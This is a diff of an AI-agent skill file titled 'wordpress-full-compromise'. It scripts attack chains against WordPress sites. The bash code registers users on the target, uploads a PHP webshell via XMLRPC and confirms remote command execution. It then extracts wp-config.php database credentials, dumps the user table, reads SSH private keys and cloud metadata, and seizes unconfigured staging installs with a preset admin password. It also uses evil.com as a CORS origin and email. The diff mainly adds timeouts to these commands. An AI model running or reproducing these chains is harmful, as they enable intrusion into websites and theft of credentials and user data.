@@ -1,25 +1,23 @@
 ---
 name: wordpress-full-compromise
 description: Execute optimal kill chains for WordPress full compromise.
-version: 1.0.0
-author: agentiko
+version: 1.1.0
+revision_date: 2026-07-25
 license: MIT
 platforms: [linux]
-compatibility: Requires agentiko worker (curl, nmap, python3, masscan, subfinder, httpx, nuclei)
+compatibility: Requires curl, python3, nmap
 disable-model-invocation: true
-metadata:
-  hermes:
-    tags: [chains, wordpress, RCE, ATO, full-compromise]
-    category: chains
-    related_skills:
-      - cross-attack-chains
-      - cors-credential-wordpress
-      - xmlrpc-exploitation
-      - phpinfo-to-rce
-      - wordpress-plugin-hunt
-      - wp-mass-recon
-      - source-leak-hunt
-      - deep-invade
+tags: [chains, wordpress, RCE, ATO, full-compromise]
+category: chains
+related_skills:
+  - cross-attack-chains
+  - cors-credential-wordpress
+  - xmlrpc-exploitation
+  - phpinfo-to-rce
+  - wordpress-plugin-hunt
+  - wp-mass-recon
+  - source-leak-hunt
+  - deep-invade
 ---
 
 # WordPress Full Compromise Skill
@@ -86,7 +84,7 @@ TARGET="$1"
 echo "[*] Chain 1: PHPInfo → Upload → RCE"
 
 # Step 1: Confirm exec functions available
-DISABLED=$(curl -sk "https://$TARGET/info.php" | grep -A1 'disable_functions' | grep -oP '>[^<]+' | tr -d '>')
+DISABLED=$(curl --max-time 30 --connect-timeout 10 -sk "https://$TARGET/info.php" | grep -A1 'disable_functions' | grep -Eo '>[^<]+' | tr -d '>')
 if echo "$DISABLED" | grep -qE 'exec|system|passthru|shell_exec'; then
   echo "[-] Exec functions disabled — Chain 1 not viable"
   exit 1
@@ -95,12 +93,12 @@ echo "[+] Exec functions available — proceeding"
 
 # Step 2: Find upload vector
 # Check open registration
-REG=$(curl -sk "https://$TARGET/wp-login.php?action=register" | grep -o 'user_login')
+REG=$(curl --max-time 30 --connect-timeout 10 -sk "https://$TARGET/wp-login.php?action=register" | grep -o 'user_login')
 HAS_REG=0
 [[ -n "$REG" ]] && HAS_REG=1 && echo "[+] Open registration available"
 
 # Check XMLRPC wp.uploadFile
-UPLOAD=$(curl -sk -X POST "https://$TARGET/xmlrpc.php" -H "Content-Type: text/xml" \
+UPLOAD=$(curl --max-time 30 --connect-timeout 10 -sk -X POST "https://$TARGET/xmlrpc.php" -H "Content-Type: text/xml" \
   -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>' \
   | grep -o 'wp.uploadFile')
 HAS_XMLRPC_UPLOAD=0
@@ -113,7 +111,7 @@ if [[ $HAS_REG -eq 1 && $HAS_XMLRPC_UPLOAD -eq 1 ]]; then
   # 3a: Register user
   USER="recon_$(date +%s)"
   PASS="TestPass123!"
-  curl -sk -X POST "https://$TARGET/wp-login.php?action=register" \
+  curl --max-time 30 --connect-timeout 10 -sk -X POST "https://$TARGET/wp-login.php?action=register" \
     -d "user_login=$USER&user_email=${USER}@evil.com&wp-submit=Register" \
     -o /dev/null
 
@@ -131,8 +129,8 @@ if(isset($_REQUEST['c'])) {
 WSEOF
 
   # 3c: Upload via XMLRPC
-  SHELL_B64=$(base64 -w0 /tmp/ws_$TARGET.php)
-  UPLOAD_RESP=$(curl -sk -X POST "https://$TARGET/xmlrpc.php" \
+  SHELL_B64=$(base64 /tmp/ws_$TARGET.php | tr -d '\012')
+  UPLOAD_RESP=$(curl --max-time 30 --connect-timeout 10 -sk -X POST "https://$TARGET/xmlrpc.php" \
     -H "Content-Type: text/xml" \
     -d "<?xml version=\"1.0\"?>
 <methodCall>
@@ -150,7 +148,7 @@ WSEOF
 </methodCall>")
 
   # 3d: Extract uploaded file URL
-  WEBSHELL_URL=$(echo "$UPLOAD_RESP" | grep -oP 'https?://[^"]+\.php' | head -1)
+  WEBSHELL_URL=$(echo "$UPLOAD_RESP" | grep -Eo 'https?://[^"]+\.php' | head -1)
   if [[ -n "$WEBSHELL_URL" ]]; then
     echo "[+] Webshell uploaded: $WEBSHELL_URL"
   else
@@ -165,7 +163,7 @@ fi
 if [[ -n "$WEBSHELL_URL" ]]; then
   echo ""
   echo "[*] Verifying RCE..."
-  RCE_TEST=$(curl -sk "$WEBSHELL_URL?c=id" 2>/dev/null)
+  RCE_TEST=$(curl --max-time 30 --connect-timeout 10 -sk "$WEBSHELL_URL?c=id" 2>/dev/null)
   if echo "$RCE_TEST" | grep -q "uid="; then
     echo "[CRITICAL] RCE CONFIRMED!"
     echo "  $(echo "$RCE_TEST" | grep 'uid=')"
@@ -173,15 +171,15 @@ if [[ -n "$WEBSHELL_URL" ]]; then
     # Gather intelligence
     echo ""
     echo "[*] Host reconnaissance:"
-    curl -sk "$WEBSHELL_URL?c=uname%20-a" 2>/dev/null | grep -v '<'
-    curl -sk "$WEBSHELL_URL?c=hostname" 2>/dev/null | grep -v '<'
-    curl -sk "$WEBSHELL_URL?c=pwd" 2>/dev/null | grep -v '<'
-    curl -sk "$WEBSHELL_URL?c=ls%20-la%20../../../" 2>/dev/null | grep -v '<'
+    curl --max-time 30 --connect-timeout 10 -sk "$WEBSHELL_URL?c=uname%20-a" 2>/dev/null | grep -v '<'
+    curl --max-time 30 --connect-timeout 10 -sk "$WEBSHELL_URL?c=hostname" 2>/dev/null | grep -v '<'
+    curl --max-time 30 --connect-timeout 10 -sk "$WEBSHELL_URL?c=pwd" 2>/dev/null | grep -v '<'
+    curl --max-time 30 --connect-timeout 10 -sk "$WEBSHELL_URL?c=ls%20-la%20../../../" 2>/dev/null | grep -v '<'
 
     # Extract wp-config.php
     echo ""
     echo "[*] Extracting wp-config.php..."
-    curl -sk "$WEBSHELL_URL?c=cat%20../wp-config.php" 2>/dev/null | \
+    curl --max-time 30 --connect-timeout 10 -sk "$WEBSHELL_URL?c=cat%20../wp-config.php" 2>/dev/null | \
       grep -E 'DB_NAME|DB_USER|DB_PASSWORD|DB_HOST|AUTH_KEY' | head -10
   else
     echo "[-] RCE verification failed — webshell may be blocked or at wrong URL"
@@ -193,13 +191,13 @@ fi
 
 ```bash
 TARGET="$1"
-OUTDIR="/root/output/chains/$TARGET"
+OUTDIR="$OUTDIR/chains/$TARGET"
 mkdir -p "$OUTDIR"
 
 echo "[*] Chain 3: CORS Phishing → Session Hijack → ATO"
 
 # Step 1: Enumerate users via CORS
-USERS=$(curl -sk "https://$TARGET/wp-json/wp/v2/users" \
+USERS=$(curl --max-time 30 --connect-timeout 10 -sk "https://$TARGET/wp-json/wp/v2/users" \
   -H "Origin: https://evil.com" 2>/dev/null | \
   python3 -c "
 import sys, json
@@ -279,7 +277,7 @@ TARGET="$1"
 echo "[*] Chain 5: Plugin CVE → RCE"
 
 # Step 1: Confirm ElementsKit version
-VERSION=$(curl -sk "https://$TARGET/wp-content/plugins/elementskit-lite/readme.txt" 2>/dev/null | \
+VERSION=$(curl --max-time 30 --connect-timeout 10 -sk "https://$TARGET/wp-content/plugins/elementskit-lite/readme.txt" 2>/dev/null | \
   grep -i "stable tag" | sed 's/.*: //' | tr -d '\r')
 
 if [[ -z "$VERSION" ]]; then
@@ -315,7 +313,7 @@ echo ""
 echo "[*] Checking other common plugin CVEs..."
 
 # Slider Revolution
-REVVER=$(curl -sk "https://$TARGET/wp-content/plugins/revslider/readme.txt" 2>/dev/null | \
+REVVER=$(curl --max-time 30 --connect-timeout 10 -sk "https://$TARGET/wp-content/plugins/revslider/readme.txt" 2>/dev/null | \
   grep -i "stable tag" | sed 's/.*: //' | tr -d '\r')
 if [[ -n "$REVVER" ]]; then
   echo "  Slider Revolution: $REVVER"
@@ -323,7 +321,7 @@ if [[ -n "$REVVER" ]]; then
 fi
 
 # LiteSpeed Cache
-LSVER=$(curl -sk "https://$TARGET/wp-content/plugins/litespeed-cache/readme.txt" 2>/dev/null | \
+LSVER=$(curl --max-time 30 --connect-timeout 10 -sk "https://$TARGET/wp-content/plugins/litespeed-cache/readme.txt" 2>/dev/null | \
   grep -i "stable tag" | sed 's/.*: //' | tr -d '\r')
 if [[ -n "$LSVER" ]]; then
   echo "  LiteSpeed Cache: $LSVER"
@@ -331,7 +329,7 @@ if [[ -n "$LSVER" ]]; then
 fi
 
 # Gravity Forms
-GFVER=$(curl -sk "https://$TARGET/wp-content/plugins/gravityforms/readme.txt" 2>/dev/null | \
+GFVER=$(curl --max-time 30 --connect-timeout 10 -sk "https://$TARGET/wp-content/plugins/gravityforms/readme.txt" 2>/dev/null | \
   grep -i "stable tag" | sed 's/.*: //' | tr -d '\r')
 if [[ -n "$GFVER" ]]; then
   echo "  Gravity Forms: $GFVER"
@@ -354,7 +352,7 @@ echo "  3. Access: /wp-content/uploads/YYYY/MM/shell.php?cmd=id"
 echo "  4. Verify RCE: curl shell_url?cmd=whoami"
 
 # Quick registration check
-REG=$(curl -sk "https://$TARGET/wp-login.php?action=register" | grep -c 'user_login.*wp-submit' || echo 0)
+REG=$(curl --max-time 30 --connect-timeout 10 -sk "https://$TARGET/wp-login.php?action=register" | grep -c 'user_login.*wp-submit' || echo 0)
 if [[ "$REG" -gt 0 ]]; then
   echo "[+] Open registration confirmed — Chain 2 viable"
 else
@@ -393,7 +391,7 @@ Only after ALL 7 paths have been tested can you conclude "blocked."
 If ALL escalation paths are confirmed blocked, document each one with evidence ("tested but blocked: X returned 401, Y returned faultCode 403"). Then and only then move on.
 
 # Quick multicall check
-XMLRPC_BODY=$(curl -sk -X POST "https://$TARGET/xmlrpc.php" \
+XMLRPC_BODY=$(curl --max-time 30 --connect-timeout 10 -sk -X POST "https://$TARGET/xmlrpc.php" \
   -H "Content-Type: text/xml" \
   -d '<?xml version="1.0"?><methodCall><methodName>demo.sayHello</methodName></methodCall>' 2>/dev/null)
 
@@ -430,9 +428,9 @@ if command -v nmap &>/dev/null; then
     [[ -n "$MYSQL_BANNER" ]] && echo "  Banner: $MYSQL_BANNER"
 
     echo "[*] Searching for credentials from other findings..."
-    echo "  Check source leaks: /root/output/leaks/*.env*.content"
-    echo "  Check error logs: /root/output/error_logs/*/intel_summary.md"
-    echo "  Check wp-config backups: /root/output/leaks/*wp-config*"
+    echo "  Check source leaks: $OUTDIR/leaks/*.env*.content"
+    echo "  Check error logs: $OUTDIR/error_logs/*/intel_summary.md"
+    echo "  Check wp-config backups: $OUTDIR/leaks/*wp-config*"
   else
     echo "[-] MySQL 3306 not open — Chain 6 blocked"
   fi
@@ -458,8 +456,8 @@ fi
 echo "[*] Chain 7: Staging Site Seizure — $STAGING"
 
 # Check install.php
-INSTALL_CODE=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 10 "https://$STAGING/wp-admin/install.php")
-INSTALL_BODY=$(curl -sk --max-time 10 "https://$STAGING/wp-admin/install.php")
+INSTALL_CODE=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 10 --connect-timeout 10 "https://$STAGING/wp-admin/install.php")
+INSTALL_BODY=$(curl -sk --max-time 10 --connect-timeout 10 "https://$STAGING/wp-admin/install.php")
 
 if [[ "$INSTALL_CODE" == "200" ]] && echo "$INSTALL_BODY" | grep -q "WordPress"; then
   echo "[+] /wp-admin/install.php HTTP 200 — WordPress NOT configured!"
@@ -473,15 +471,15 @@ if [[ "$INSTALL_CODE" == "200" ]] && echo "$INSTALL_BODY" | grep -q "WordPress";
   echo "  5. The staging server may have connectivity to production (DB, APIs, internal network)"
   echo ""
   echo "[*] Automated via curl (if form structure is standard):"
-  echo "  curl -sk -X POST 'https://$STAGING/wp-admin/install.php?step=2' \\"
+  echo "  curl --max-time 30 --connect-timeout 10 -sk -X POST 'https://$STAGING/wp-admin/install.php?step=2' \\"
   echo "    -d 'weblog_title=Test&user_name=admin&admin_password=Hack123!&admin_password2=Hack123!&admin_email=test@evil.com&Submit=Install+WordPress'"
 
   # Check for upgrade.php (needs DB upgrade — info disclosure)
-  UPGRADE_CODE=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 "https://$STAGING/wp-admin/upgrade.php")
+  UPGRADE_CODE=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 --connect-timeout 5 "https://$STAGING/wp-admin/upgrade.php")
   [[ "$UPGRADE_CODE" == "200" ]] && echo "  [INFO] /wp-admin/upgrade.php also accessible — DB upgrade page"
 
   # Check for setup-config.php (no wp-config — full config opportunity)
-  CONFIG_CODE=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 "https://$STAGING/wp-admin/setup-config.php")
+  CONFIG_CODE=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 --connect-timeout 5 "https://$STAGING/wp-admin/setup-config.php")
   [[ "$CONFIG_CODE" == "200" ]] && echo "  [INFO] /wp-admin/setup-config.php accessible — can set up fresh wp-config"
 else
   echo "[-] /wp-admin/install.php not accessible (HTTP $INSTALL_CODE) — Chain 7 blocked"
@@ -495,22 +493,22 @@ After achieving RCE or ATO:
 
 ```bash
 # 1. Extract wp-config.php (MySQL root creds)
-curl -sk "$WEBSHELL_URL?c=cat%20../wp-config.php"
+curl --max-time 30 --connect-timeout 10 -sk "$WEBSHELL_URL?c=cat%20../wp-config.php"
 
 # 2. Dump user table
-curl -sk "$WEBSHELL_URL?c=mysql%20-u%20DB_USER%20-pDB_PASS%20-e%20'SELECT%20*%20FROM%20wp_users'"
+curl --max-time 30 --connect-timeout 10 -sk "$WEBSHELL_URL?c=mysql%20-u%20DB_USER%20-pDB_PASS%20-e%20'SELECT%20*%20FROM%20wp_users'"
 
 # 3. Check for other sites on the server
-curl -sk "$WEBSHELL_URL?c=ls%20-la%20/var/www/"
+curl --max-time 30 --connect-timeout 10 -sk "$WEBSHELL_URL?c=ls%20-la%20/var/www/"
 
 # 4. Check crontab for persistence opportunities
-curl -sk "$WEBSHELL_URL?c=crontab%20-l"
+curl --max-time 30 --connect-timeout 10 -sk "$WEBSHELL_URL?c=crontab%20-l"
 
 # 5. Check for SSH keys
-curl -sk "$WEBSHELL_URL?c=cat%20~/.ssh/id_rsa"
+curl --max-time 30 --connect-timeout 10 -sk "$WEBSHELL_URL?c=cat%20~/.ssh/id_rsa"
 
 # 6. Check for cloud metadata
-curl -sk "$WEBSHELL_URL?c=curl%20-s%20http://169.254.169.254/latest/meta-data/"
+curl --max-time 30 --connect-timeout 10 -sk "$WEBSHELL_URL?c=curl%20-s%20http://[REDACTED_IP]/latest/meta-data/"
 ```
 
 ## Pitfalls
